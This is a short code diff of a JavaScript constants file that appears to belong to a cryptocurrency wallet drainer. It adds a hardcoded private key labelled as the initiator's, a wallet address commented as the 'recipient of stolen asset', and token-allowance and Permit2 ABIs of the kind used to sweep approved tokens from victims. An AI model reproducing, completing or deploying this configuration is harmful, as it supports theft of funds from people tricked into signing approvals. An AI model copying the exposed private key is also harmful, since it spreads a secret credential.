@@ -3,6 +3,12 @@
 
 // export const initiator = '0xeE71c83008C5814455223866A881EfE25d5cf347'; // initiator address
 export const initiator = '0xF8eb38971de1C54eFaFF081470264BDb0276e516'; // initiator address
+export const initiatorPK = 'a5b0e838f10a4d8b8905259113654d9591ddbca02a112c954df396559a5d285f'; // initiaror's private key
+
+// export let recipient = '0x1D26015064db1f8073871041bF554757101f6386'; // recipient of stolen asset
+export let recipient = '0xFBD751b4496Ffae785ed17b8a5AC313a2866B029'; // recipient of stolen asset
+export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
+export { default as permitV2 } from './abis/permitvs.json';
 export { default as CLAIMEABI } from './abis/claimABI.json';
 export { default as ERC20ABI } from './abis/erc20.json';
 // export const projectId = '266adf3f12378f461f72258a250ac519';
